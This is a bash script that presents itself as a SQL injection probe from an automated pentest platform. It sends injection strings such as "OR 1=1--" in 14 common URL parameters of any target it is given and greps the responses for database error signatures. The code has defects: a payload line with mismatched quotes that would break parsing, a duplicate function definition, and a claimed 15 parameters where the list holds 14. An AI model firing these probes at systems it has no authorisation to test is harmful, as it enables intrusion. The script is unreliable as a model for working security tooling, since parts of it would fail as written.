#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        SQL Injection Error-Based Probe (15 params)
# Description: Sends SQLi payloads to common parameters and checks for database errors
# Severity:    HIGH
# Category:    Injection Flaws (SQLi, XSS, Command, SSTI, XXE)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: SQL Injection Error-Based Probe (15 params)\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
PARAMS="id cat page product_id item_id user_id article_id post_id news_id story_id pid sid num number"
PAYLOADS="' " "\"" OR 1=1--" "1'" "1 AND 1=1" "1' AND '1'='1"
ERRORS="SQL syntax.*MySQL\|Warning.*mysql_\|UNClosed quotation mark\|quoted string not properly terminated\|PostgreSQL.*ERROR\|ORA-[0-9]+\|Microsoft.*ODBC\|SQLite.*error\|SQLITE_ERROR\|syntax error.*SQL\|unterminated quoted string"
for P in $PARAMS; do
  for PL in "\'" "\" OR 1=1--" "1'" "1 AND 1=1"; do
    RESP=$(curl -s --max-time 8 "$T?$P=$PL" 2>/dev/null | head -c 5000)
    if echo "$RESP" | grep -qiE "$ERRORS"; then
      DBERR=$(echo "$RESP" | grep -oiE "$ERRORS" | head -1)
      emit "{\"title\":\"SQL injection (error-based): ?$P=\",\"severity\":\"critical\",\"description\":\"Parameter ?$P= produces database error with SQLi payload: $DBERR. Database is interpreting injected SQL.\",\"remediation\":\"Use parameterized queries / prepared statements. Validate and sanitize all input.\",\"cweId\":\"CWE-89\",\"owaspCategory\":\"A03:2025-Injection\"}"
      break
    fi
  done
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
